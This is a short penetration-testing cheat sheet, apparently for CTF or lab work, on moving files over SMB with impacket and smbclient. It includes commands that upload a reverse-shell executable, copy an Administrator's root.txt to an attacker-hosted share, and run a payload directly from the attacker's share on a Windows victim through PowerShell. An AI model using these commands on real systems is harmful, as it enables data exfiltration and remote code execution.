---
layout: default
title: SMB Transfer
permalink: /smb_transfer/
---

# File Transfer Over SMB

### Bi-directional

```
impacket-smbclient "$user:$pass@$ip"
use Shared
put rev_shell.exe
get secret.txt
```

```
smbclient -L 192.168.31.141
smbclient "\\\\192.168.31.141\share"
ls
get ignite.txt
put data.txt
```

#### Sender
`impacket-smbserver share .` <br>
`impacket-smbserver share $(pwd) -smb2support -username smbuser -password smbpass` <br>
Sometimes it is not allowed to connect to shares without authentication.

#### Receiver

```
net use \\10.10.10.45\share /user:smbuser
smbpass
```

`copy ignite.txt \\192.168.31.141\share\ignite.txt`

to instantly execute it: `powershell -c (\\<kali_IP\<server_name>\<payload)`

or just copy: `copy \\192.168.31.141\share\ignite.txt`

`copy C:\Users\Administrator\Desktop\root.txt \\10.10.10.79\share\`

Kali -> Victim

| Kali    | Windows Victim PowerShell |
| -------- | ------- |
| impacket-smbserver <server_name> .  | to instantly execute it: powershell -c (\\<kali_IP\<server_name>\<payload) |

impacket-smbserver <server_name> .
